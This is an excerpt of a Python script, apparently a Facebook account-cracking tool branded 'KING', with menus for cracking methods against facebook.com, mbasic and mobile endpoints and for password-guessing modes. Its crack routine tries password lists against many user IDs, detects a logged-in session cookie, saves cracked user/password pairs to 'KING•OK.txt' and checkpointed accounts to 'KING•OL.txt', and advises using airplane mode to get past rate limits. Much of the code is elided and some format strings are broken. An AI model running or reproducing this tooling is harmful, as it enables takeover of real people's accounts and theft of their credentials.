...
try:
    ...
    print('\n [\033[1;32m✓\033[1;37m] installing requests !...\n')
...
BM = '\x1b[1;101m' # RED STUDY
BA = '\x1b[1;100m' # ASH BACK
my_color = [
 P, M, H, K, B, U, O, N]
...
def mentod():
    print('%s–––––––––––––––––––––––––––––––––––––––––––––––\n %s Select Method Menu%s'%(N,BM,N))
    print('[\033[1;32m+\033[1;37m] Method 1 free (%sRecommended%s)'%(N,H,N,H,N))
    print('[\033[1;32m+\033[1;37m] Method 2 mbasic (%sRecommended%s)'%(H,N,H,N))
    print('[\033[1;32m+\033[1;37m] Method 3 mobile (%sRecommended%s)'%(H,N,H,N))
#-------- LOADING ANIMASI ------------
def loading():
...
def logo():
    os.system("clear")
    print("""
         88  dP 88 88b 88  dP""b8  \033[1;31mX\033[1;37m
         88odP  88 88Yb88 dP   `"
...
def hasil(ok,cp):
    if len(ok) != 0 or len(cp) != 0:
        ...
        if cek_cp =="":
            ...
            if ww in ("Y","y","ya"):
                ubahP.append("y")
                print(f" {N}[{H}•{N}] Password example : {H}King123{N}")
...
def cek_apk(session,coki):
    ...
    if len(game)==0:
        ...
        print(f'\r 🎮  %sYOUR ACTIVE APPLICATION DETAILS :'%(B))
    ...
    if len(game)==0:
        ...
        print(f'\r 🎮  %sYour Expired Application Details :'%(K))
        for i in range(len(game)):
...
def file():
            os.system("clear")
            logo()
            print("[\033[1;32m1\033[1;37m] File Clone ")
            print ("[\033[1;32m2\033[1;37m] Join Group ")
            key = input("\n[\033[1;32m~\033[1;37m] Select : ")
            if key in [""]:
                ...
                os.system(f'xdg-open https://facebook.com/groups/774714457590211/'+id)
...
class __chigoue__:
    ...
    def chi(self, id):
        os.system("clear")
        logo()
        crot = input(f"[\033[1;32m~\033[1;37m] Do You Want To Show The App? [\033[1;32mY\033[1;37m/\033[1;32mN\033[1;37m] ? : ")
        if crot in[""]:
            ...
            print(f" {P}[{P}×{P}] Select Between y/t");__chigoue__().chi(id)
        os.system("clear")
        logo()
...
# PROSES CRACK METODE 3 in 1
    def __metode__(self, cebok, user, pasw):
        global ok,cp,loop
        animasi = random.choice(["\x1b[1;92m[Running]","\x1b[1;92m[Running]","\x1b[1;92m[Running]","\x1b[1;92m[Running]","\x1b[1;92m[Running]","\x1b[1;92m[Running]","\x1b[1;92m[Running]"])
        sys.stdout.write(f"\r \x1b[1;97m[Running] {loop}|{len(self.id)} [ok][{len(ok)}] [cp][{len(cp)}] ")
        sys.stdout.flush()   
            ...
            for pw in pasw:
                ...
                if "c_user" in session.cookies.get_dict():
                    ...
                    if "t" in Apk:
                        ...
                        print(f'\r {H}Year   : {year}\n')
                    elif "y" in Apk:
                        print(f"\r{H} [Successful] {user} | {pw}")
                        print(f'\r {H}Year   : {year}')
                    wrt = '[Successful] %s • %s' % (user,pw)
                    ok.append(wrt)
                    cek_apk(session,coki)
                    cek_year[session,coki]
                    open('KING•OK.txt' , 'a').write('%s\n' % wrt)
                    break
                    ...
                    try:
                        ...
                        wrt = '%s|%s' % (user,pw,day,month,year)
                        cp.append(wrt)
                        open('KING•OL.txt' , 'a').write('%s\n' % wrt)
                        break
    ...
    def __pler__(self):
        os.system('clear')
        logo()
        print ('[\033[1;32m+\033[1;37m] Select Method ')
        print ('[\033[1;32m+\033[1;37m] Method 1 [ free ]')
        print ('[\033[1;32m+\033[1;37m] Method 2 [ mbasic ]')
        print ('[\033[1;32m+\033[1;37m] Method 3 [ m.facebook ]')
        yan = input('\n%s[%s?%s] Select : '%(P,P,P))
        if yan == '':
            print('\n %s[%s×%s] Sorry, it is wrong...!'%(P,P,P));self.__pler__()
        elif yan in ('1', '01'):
    ...
    def kombinasi_pw(self,url):
        print('%s–––––––––––––––––––––––––––––––––––––––––––––––\n%sSetting Password Menu%s'%(P,P,P))
        print('%s[%s1%s] Auto Password 1 [ \033[1;32mBest\033[1;37m ]'%(P,P,P))
        print('%s[%s2%s] Auto Password 2'%(P,P,P))
        pw = input(f"\n{P}[{P}+{P}] Select Method : ")
        if pw in[""]:
            print(f" {N}[{M}!{N}] Don't be empty");self.kombinasi_pw(url)
        elif pw in["1","01"]:
            print('–––––––––––––––––––––––––––––––––––––––––––––––')
            print('[\033[1;32m+\033[1;37m] Cracking Limit : %s ' % len(self.id))
            print('[\033[1;32m+\033[1;37m] Use Airplane Mode To Speed Up')
            print('[\033[1;32m+\033[1;37m] The Process is running in the background')
            print(47*"-")
